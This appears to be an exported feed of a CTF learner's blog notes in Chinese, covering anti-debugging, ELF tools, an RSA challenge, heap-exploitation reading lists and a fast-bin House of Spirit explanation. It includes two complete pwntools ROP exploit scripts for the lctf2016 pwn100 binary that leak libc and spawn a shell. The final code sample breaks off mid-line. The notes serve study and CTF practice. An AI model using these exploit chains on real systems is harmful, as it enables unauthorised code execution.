<h2 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h2><p><a href="http://blog.csdn.net/yangbostar/article/details/6194159" target="_blank" rel="external">http://blog.csdn.net/yangbostar/article/details/6194159</a><br>这个作者有一系列文章, 比如病毒编写<br>花指令思想:<br>把垃圾数据填充在不会执行到的地方…如何保证这些地方不被执行<br>作者提到</p>
<ol>
<li>通过jz + jnz 这样子的来替代jmp</li>
<li>利用某些运算(如xor..)间接控制标志位 + 条件跳转</li>
<li>利用API函数操作返回特定返回值</li>
</ol>
<p>在没有找到相关的文章,暂时就这样子</p>
<h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><p><a href="http://zke1ev3n.me/2015/12/15/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/" target="_blank" rel="external">http://zke1ev3n.me/2015/12/15/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/</a></p>
<p><em>具体还自己看程序员的自我修养</em> 很重要待办事项</p>
<h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p><a href="http://www.freebuf.com/sectool/83509.html" target="_blank" rel="external">http://www.freebuf.com/sectool/83509.html</a><br>这一篇,赞,棒</p>
<ol>
<li><p>开始就讲到<code>ptrace</code>反调试,想起来上次HBCTF也有这样子一个题目,要patch掉<code>ptrace</code></p>
</li>
<li><p>之后讲到如果是<code>gdb &lt;TARGET&gt;</code>的时候可以检测父进程名称</p>
</li>
<li><p>如果是<code>attach</code>方式, 可以检查<code>TracerPid</code></p>
</li>
<li><p>alarm定时,这个我确实在CTF里遇到…当时不知道怎么办…,定时很短时间,到时间就退出,原问提到可以通过<code>设置gdb对signal的处理方式</code>来bypass.</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(gdb) i handle SIGALRM <span class="comment">// 查看SIGALRM信号处理方式</span></div><div class="line">Signal        Stop	Print	Pass to program	    Description</div><div class="line">SIGALRM       No	Yes	    Yes		            Alarm clock</div><div class="line"></div><div class="line">(gdb) handle SIGALRM nopass <span class="comment">// 设置不传递</span></div><div class="line">Signal        Stop	Print	Pass to program	    Description</div><div class="line">SIGALRM       No	Yes	    No		            Alarm clock</div></pre></td></tr></table></figure>
<p>参考 <a href="http://www.cppblog.com/fwxjj/archive/2011/12/06/161621.html" target="_blank" rel="external">http://www.cppblog.com/fwxjj/archive/2011/12/06/161621.html</a></p>
<h2 id="objdump-amp-readelf"><a href="#objdump-amp-readelf" class="headerlink" title="objdump &amp; readelf"></a>objdump &amp; readelf</h2><h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h3><p>readelf 主要是看一些相关信息, 报名哟反汇编的功能, 常用的就是<code>-S</code><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">readelf -h filename elf头部,主要是好看</div></pre></td></tr></table></figure></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">readelf -S filename 主要是看某一段(sections)的偏移和权限</div></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">readelf -l filename 主要是看某一节(segments)的信息</div></pre></td></tr></table></figure>
<p>这个<code>sections</code>和<code>segments</code>,emmmmmm~,是传说中的链接视图和执行视图里的概念</p>
<p>通常,在ELF在加载到内存里时候,系统会将权限相同的Sections合并成一个Segments</p>
<h3 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h3><p>我用这个objdump主要用来看汇编代码<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">objdump -d pwn100 反汇编</div></pre></td></tr></table></figure></p>
<p>如果当时编译的时候用了<code>-g</code>,这个时候就能更详细的显示反汇编(掺杂源代码)<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">objdump -S [-l] pwn100</div></pre></td></tr></table></figure></p>
<p>这个时候加上<code>-l</code>还能把原来行号显示出来</p>
<p><code>-j .text</code> 可以只反汇编指定的<code>section</code></p>
<p>另外记得加上这个…<code>-M intel</code>,默认是AT&amp;T的..看的我</p>
<p>最后一点<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-d, --disassemble        Display assembler contents of executable sections</div><div class="line">-D, --disassemble-all    Display assembler contents of all sections</div></pre></td></tr></table></figure></p>
<p>另外,<code>objdump -h</code>查看ELF的各个段(Sections)的时候,只是把关键的段显示出来了,而忽略了其他辅助的段,要查看所有的段,就要用<code>readelf -S</code></p>
<p>段(Sections)的名字对于编译器,链接器是有意义的,对于操作系统其实只是段的属性和权限有用</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[python 进制 字符]]></title>
      <url>/2017/07/29/python-%E8%BF%9B%E5%88%B6-%E5%AD%97%E7%AC%A6/</url>
      <content type="html"><![CDATA[<p>发现自己不会py里的这些十六进制,ascii转换什么的好尴尬</p>
<p>这样子..拿到了hbctf的一道题目,做到这一步,得到一个字符串<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="number">6E3</span>A37333036393838363737313632353634323830373433353738333636313031343036323630343236343736383438313733353134353837333530383834363932353733353532313639353135390A653A36353533370A633A3135313136373137373034353031363233303238393033393138313331353035353130353830353939353631333537333837343331323935323839303132313933393830353534303132383131</div></pre></td></tr></table></figure></p>
<p>然后要把每两位看成<code>字符的ascii的十六进制形式的话</code>,把这串字符串转换成<code>原来的字符的话</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> s.decode(<span class="string">'hex'</span>)</div><div class="line">n:<span class="number">73069886771625642807435783661014062604264768481735145873508846925735521695159</span></div><div class="line">e:<span class="number">65537</span></div><div class="line">c:<span class="number">15116717704501623028903918131505510580599561357387431295289012193980554012811</span></div></pre></td></tr></table></figure></p>
<p>这里是一个RSA,这里的c是密文,e是公钥<br>这里要把n分解可以得到p * q<br>上这个网站 <a href="http://factordb.com/index.php" target="_blank" rel="external">http://factordb.com/index.php</a> ,分解一下得到两个因子<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>p = <span class="number">189239861511125143212536989589123569301</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>q = <span class="number">386123125371923651191219869811293586459</span></div></pre></td></tr></table></figure></p>
<p>RSA 的常见攻击方法看这一篇 <a href="http://bobao.360.cn/learning/detail/3058.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3058.html</a><br>这个时候由公钥<code>e</code>和<code>p</code>,<code>q</code>可以解出来私钥<code>d</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">d =  <span class="number">30854876581442056228588093398155288897790570329196285069001545119486056472273</span></div></pre></td></tr></table></figure></p>
<p>有个私钥d, 明文c和模数n就能得到最后的密文m<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">m = pow(c, d, n)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>m</div><div class="line"><span class="number">630199562897691744494569524488740813666979952696</span></div></pre></td></tr></table></figure></p>
<p>这个m这次看起来是个十进制<br>把它变成16进制<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>hex(m)</div><div class="line"><span class="string">'0x6e63203131392e32382e31352e33342038383838'</span></div></pre></td></tr></table></figure></p>
<p>还原成字符,要把前面的0x去掉<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>hex(m)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</div><div class="line"><span class="string">'nc 119.28.15.34 8888'</span></div></pre></td></tr></table></figure></p>
<p>就这样子..感觉是不是有些地方有点笨<br>大佬说可以用<code>libnum</code>,emmmmmmmmm<br>试了下果然可以,十进制也能直接变过来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import libnum</div><div class="line">&gt;&gt;&gt; libnum.n2s(m)</div><div class="line">&apos;nc 119.28.15.34 8888&apos;</div></pre></td></tr></table></figure></p>
<p>前面的decode,encode操作对象是字符串,,,而且不带<code>0x</code><br>后面这个操作对象是数字</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[padding oracle学习]]></title>
      <url>/2017/07/28/padding-oracle%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p><a href="https://www.secpulse.com/archives/3537.html" target="_blank" rel="external">https://www.secpulse.com/archives/3537.html</a><br><a href="https://wenku.baidu.com/view/6dd0cacdda38376baf1faeb4.html" target="_blank" rel="external">https://wenku.baidu.com/view/6dd0cacdda38376baf1faeb4.html</a><br><a href="http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html" target="_blank" rel="external">http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html</a></p>
<p><a href="http://www.vuln.cn/6109" target="_blank" rel="external">http://www.vuln.cn/6109</a><br><a href="http://www.vuln.cn/6716" target="_blank" rel="external">http://www.vuln.cn/6716</a><br><a href="http://www.vuln.cn/6500" target="_blank" rel="external">http://www.vuln.cn/6500</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[off-by-one学习]]></title>
      <url>/2017/07/28/off-by-one%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p><a href="https://sploitfun.wordpress.com/2015/06/07/off-by-one-vulnerability-stack-based-2/" target="_blank" rel="external">https://sploitfun.wordpress.com/2015/06/07/off-by-one-vulnerability-stack-based-2/</a><br><a href="https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/" target="_blank" rel="external">https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/</a><br><a href="http://bobao.360.cn/learning/detail/3113.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3113.html</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[double free学习]]></title>
      <url>/2017/07/28/double-free%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p><a href="http://www.vuln.cn/6172" target="_blank" rel="external">http://www.vuln.cn/6172</a><br>这篇作者<code>explorer</code>的blog原文<br><a href="http://libc.pw/2015/08/24/Double%20Free%E6%B5%85%E6%9E%90/" target="_blank" rel="external">http://libc.pw/2015/08/24/Double%20Free%E6%B5%85%E6%9E%90/</a></p>
<p><a href="http://www.cnblogs.com/0xJDchen/p/6195919.html" target="_blank" rel="external">http://www.cnblogs.com/0xJDchen/p/6195919.html</a><br><a href="http://winesap.logdown.com/posts/258859-0ctf-2015-freenode-write-up" target="_blank" rel="external">http://winesap.logdown.com/posts/258859-0ctf-2015-freenode-write-up</a></p>
<h2 id="关于Free"><a href="#关于Free" class="headerlink" title="关于Free"></a>关于Free</h2><p>在Free的时候到底是检查哪些内容?<br>看<a href="">malloc.c</a>源码….天哦<br>是fastbins和其他bin的free时候检查不太一样</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[UAF学习]]></title>
      <url>/2017/07/28/UAF%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p><a href="http://www.vuln.cn/6275" target="_blank" rel="external">http://www.vuln.cn/6275</a><br><a href="https://sploitfun.wordpress.com/2015/06/16/use-after-free/" target="_blank" rel="external">https://sploitfun.wordpress.com/2015/06/16/use-after-free/</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[libc-database]]></title>
      <url>/2017/07/27/libc-database/</url>
      <content type="html"><![CDATA[<p>gitHub上的一个工具</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>介绍里说道这个随机化,通常是最后12bits不变化</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>gitHub上有,git下来之后,先跑一个get,然后慢慢等</p>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>lctf2016 pwn100<br>一道平常的栈溢出,格式大概是<code>&#39;A&#39; * 0x40 + &#39;A&#39; * 0x8 + ret</code><br>payload基本是从别人wp里改的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'./pwn100'</span>)</div><div class="line"><span class="comment"># p = remote('127.0.0.1', 2332)</span></div><div class="line">elf = ELF(<span class="string">'./pwn100'</span>)</div><div class="line"></div><div class="line">puts_got_addr = elf.got[<span class="string">'puts'</span>]</div><div class="line">read_got_addr = elf.got[<span class="string">'read'</span>]</div><div class="line"></div><div class="line">puts_plt_addr = elf.symbols[<span class="string">'puts'</span>]</div><div class="line">read_plt_addr = elf.symbols[<span class="string">'read'</span>]</div><div class="line"></div><div class="line">rsp = <span class="number">0x00601300</span></div><div class="line"></div><div class="line"><span class="comment"># ROPgadget --binary pwn100 --only "pop|ret"</span></div><div class="line">pop_rdi_ret = <span class="number">0x0000000000400763</span></div><div class="line">pop_rbp_ret = <span class="number">0x0000000000400595</span></div><div class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400761</span></div><div class="line">pop_pop_pop_pop_ret_addr = <span class="number">0x000000000040075d</span></div><div class="line"></div><div class="line">payload  = <span class="string">''</span></div><div class="line"><span class="comment"># leak glibc_puts</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x40</span> + <span class="string">'A'</span> * <span class="number">0x8</span> + p64(pop_rdi_ret) + p64(read_got_addr) + p64(puts_plt_addr)</div><div class="line"><span class="comment"># </span></div><div class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_r15_ret) + p64(rsp) + p64(<span class="number">1</span>) + p64(read_plt_addr)</div><div class="line"><span class="comment">#</span></div><div class="line">payload += p64(pop_pop_pop_pop_ret_addr) + p64(rsp)</div><div class="line">payload  = payload.ljust(<span class="number">0xC8</span>, <span class="string">'A'</span>)</div><div class="line"></div><div class="line">raw_input(<span class="string">'go?'</span>)</div><div class="line">p.send(payload)</div><div class="line">p.recvline()</div><div class="line">libc_read_addr = u64(p.recvline()[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"></div><div class="line">libc_base_addr = libc_read_addr - <span class="number">0x00000000000f6670</span></div><div class="line">libc_system_addr = libc_base_addr + <span class="number">0x0000000000045390</span></div><div class="line">bin_sh_addr = libc_base_addr + <span class="number">0x18c177</span></div><div class="line"></div><div class="line">log.info(<span class="string">'libc_read_addr:%s'</span> % hex(libc_read_addr))</div><div class="line"></div><div class="line">payload2  = p64(<span class="number">1</span>) * <span class="number">3</span></div><div class="line">payload2 += p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(libc_system_addr)</div><div class="line">p.sendline(payload2)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>我们先是leak出来了libc_read的地址,比方说我这里是<code>0x7fddbd085670</code><br>我使用<code>./find read 670</code>就从database里得到一个id<br>也可以多个条件~<code>./find printf 260 puts f30</code>,条件多一些会准确.,,<br>然后<code>./dump id</code>,我就得到了<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">offset___libc_start_main_ret = <span class="number">0x20830</span></div><div class="line">offset_system = <span class="number">0x0000000000045390</span></div><div class="line">offset_dup2 = <span class="number">0x00000000000f6d90</span></div><div class="line">offset_read = <span class="number">0x00000000000f6670</span></div><div class="line">offset_write = <span class="number">0x00000000000f66d0</span></div><div class="line">offset_str_bin_sh = <span class="number">0x18c177</span></div></pre></td></tr></table></figure></p>
<p>照着把这些填进去,就写好了payload<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">libc_base_addr = libc_read_addr - <span class="number">0x00000000000f6670</span></div><div class="line">libc_system_addr = libc_base_addr + <span class="number">0x0000000000045390</span></div><div class="line">bin_sh_addr = libc_base_addr + <span class="number">0x18c177</span></div></pre></td></tr></table></figure></p>
<blockquote>
<p>教训..有些人这样做出来的pwn,写完的wp…是一般不能直接拷过来跑的,因为你的libc和人家的不一样</p>
</blockquote>
<p>这里有一点感觉有点巧….<br>这里的payload1有<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># read(0, 0x00601300, 1)</span></div><div class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_r15_ret) + p64(rsp) + p64(<span class="number">1</span>) + p64(read_plt_addr)</div><div class="line"><span class="comment"># rsp &lt;- 0x00601300, 后续pop,pop,pop,ret</span></div><div class="line">payload += p64(pop_pop_pop_pop_ret_addr) + p64(rsp)</div></pre></td></tr></table></figure></p>
<p>先在<code>0x00601300</code>这里铺好了payload2<br>第一个<code>pop rsp</code> 改变了栈顶到<code>0x00601300</code>, 还剩下三个pop出了3个1,然后….<br>这个时候栈顶到了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">payload2  = p64(<span class="number">1</span>) * <span class="number">3</span></div><div class="line">payload2 += p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(libc_system_addr)</div></pre></td></tr></table></figure></p>
<p>然后起来shell</p>
<p>我写的话,大概会是再次返回vuln_function….原作者的写法太奇了….我还是比较菜到怀疑人生<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'./pwn100'</span>)</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./pwn100'</span>)</div><div class="line"></div><div class="line">puts_got_addr = elf.got[<span class="string">'puts'</span>]</div><div class="line">read_got_addr = elf.got[<span class="string">'read'</span>]</div><div class="line"></div><div class="line">puts_plt_addr = elf.symbols[<span class="string">'puts'</span>]</div><div class="line">read_plt_addr = elf.symbols[<span class="string">'read'</span>]</div><div class="line"></div><div class="line">vuln_function = <span class="number">0x40068E</span></div><div class="line"></div><div class="line"><span class="comment"># ROPgadget --binary pwn100 --only "pop|ret"</span></div><div class="line">pop_rdi_ret = <span class="number">0x0000000000400763</span></div><div class="line">pop_rbp_ret = <span class="number">0x0000000000400595</span></div><div class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400761</span></div><div class="line">pop_pop_pop_pop_ret_addr = <span class="number">0x000000000040075d</span></div><div class="line"></div><div class="line"></div><div class="line">payload  = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x40</span> + <span class="string">'A'</span> * <span class="number">0x8</span> + p64(pop_rdi_ret) + p64(read_got_addr) + p64(puts_plt_addr)</div><div class="line">payload += p64(vuln_function)</div><div class="line"></div><div class="line">payload  = payload.ljust(<span class="number">0xC8</span>, <span class="string">'A'</span>)</div><div class="line"></div><div class="line">raw_input(<span class="string">'go?'</span>)</div><div class="line">p.send(payload)</div><div class="line">p.recvline()</div><div class="line">libc_read_addr = u64(p.recvline()[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"></div><div class="line">libc_base_addr = libc_read_addr - <span class="number">0x00000000000f6670</span></div><div class="line">libc_system_addr = libc_base_addr + <span class="number">0x0000000000045390</span></div><div class="line">bin_sh_addr = libc_base_addr + <span class="number">0x18c177</span></div><div class="line"></div><div class="line">log.info(<span class="string">'libc_read_addr:%s'</span> % hex(libc_read_addr))</div><div class="line"></div><div class="line">payload  = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x40</span> + <span class="string">'A'</span> * <span class="number">0x8</span> + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(libc_system_addr)</div><div class="line">payload  = payload.ljust(<span class="number">0xC8</span>, <span class="string">'A'</span>)</div><div class="line"></div><div class="line">raw_input(<span class="string">'go?'</span>)</div><div class="line">p.send(payload)</div><div class="line">p.recvline()</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[House of Spirit]]></title>
      <url>/2017/07/26/House-of-Spirit/</url>
      <content type="html"><![CDATA[<p>在SploitFun的文章里提到</p>
<ul>
<li>House of Prime</li>
<li>House of Mind</li>
<li>House of Force</li>
<li>House of Lore</li>
<li>House of Spirit<br>崩溃,诶?查了一下资料发现,在CTF里出现的好像只有<code>House of Spirit</code>和<code>House of Force</code>,ahhhh~, 然后找一些文章学习一下这个<code>House of Spirit</code>,这个技术是与<code>fast bin</code>有关的,所以先学一下fast bin</li>
</ul>
<h2 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h2><p>看一看<a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">这个</a>和<a href="http://www.cnblogs.com/Ox9A82/p/5865420.html" target="_blank" rel="external">这个</a></p>
<p>Fast bin简单的来说就是 16-80 字节(不过好像其实是16-64)的bin优先使用fast bin<br>只有<code>fd</code>指针,最后一块的fd是空值<br>不会被合并,因为标志位都总是1</p>
<blockquote>
<p>环境说的都是x86,如果x64的话是32-128字节之间</p>
</blockquote>
<p>先进后出,像栈一样,fastbin list指向最外边(第一块)的fast bin,就是即将被取出的</p>
<p>有新的fastbin加入fastbin list的时候,新来的fastbin的fd指针指向原来最靠外的fastbin,同时fastbin list指向新来的fastbin</p>
<p>有malloc请求时候,最外边的一块(第一块),被取下,然后fastbin list会指向取下来这块的fd指向的那个地址,这个时候你的机会来了,你如果能在即将取走这块前改写他的fd,那么…怎么改写,,,一般是堆溢出</p>
<p>现在基本清楚了,那个size字段指的大小不是data的大小,本块某一字段加上本块的size值就找到了下一块相应字段的地址,所以这个size是data加上头部的大小<br>同时这个size和fast binlist是对应的</p>
<h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</div><div class="line">    <span class="keyword">void</span> *buf0, *buf1, *buf2;</div><div class="line"></div><div class="line">    buf0 = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line">    buf1 = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line"></div><div class="line">    <span class="built_in">free</span>(buf1);</div><div class="line">    <span class="built_in">free</span>(buf0);</div><div class="line"></div><div class="line">    buf0 = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line">    read(<span class="number">0</span>, buf0, <span class="number">64</span>);</div><div class="line">    buf1 = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line"></div><div class="line"></div><div class="line">    buf2 = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"buf2 is at %p\n"</span>, buf2);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>来自上面提到的<a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">blog</a></p>
<p>malloc的顺序决定了<code>buf0</code>是地址比较小的那一块,所以<code>read</code>处对<code>buf0</code>的写能溢出改掉<code>buf1</code>的<code>fd</code></p>
<p>而这个<code>free</code>的顺序能决定,大概是fastbin list链着的顺序<br>free掉buf0: list[x] -&gt; buf1<br>free掉buf1: list[x] -&gt; buf0 -&gt; buf1</p>
<p>malloc了一次: list[x] -&gt; buf1</p>
<blockquote>
<p>这个时候list的地址应该是指向buf1这块吧,感觉原作者这里是不是画错了</p>
</blockquote>
<p>read一次,这个时候,可以改掉buf1的fd,这个fd就是我们伪造的堆块了</p>
<p>malloc第二次, 在buf1从list上unlink的时候,会把buf1的fd指向的地址,链接进去</p>
<p>malloc第三次,这个时候,会把伪造的堆块分配出来,,,</p>
<p>由于要检查chunk的size,所以我们伪造的堆块的size也应该和前面的buf1和buf0相同,所以我们伪造的堆块的偏移+4的地方,emmmm,就是那个size的地方要改成这个,或者找个满足条件的size值,伪造fd成这个值-4</p>
<p>还要注意一点就是malloc返回的值是data的地址,而系统自己管理list的时候list指向和fd指向都是指向头部,头部和data是偏移8个字节</p>
<p>这个时候我们就可以对buf2所指向的地方写了,实现任意地址读写</p>
<p>这个伪造的地址一般是bss段,要布置好<br><code>previous_size</code>[4字节] + <code>size</code>[4字节] + <code>fd</code>[4字节]<br>注意size值就行了</p>
<h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>主要参考<a href="http://anquan.360.cn/learning/detail/3417.html" target="_blank" rel="external">这一篇</a>和上面的两篇<br>感觉大概是..emmmmmm~前面讲到的是在bss段上伪造堆,这个bss不属于随机化的一部分,程序运行前就能看到bss段基地址 <del>这个HOS的话,看起来是花式在栈上伪造一个堆</del></p>
<p>原文的例子<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">void</span> *p = 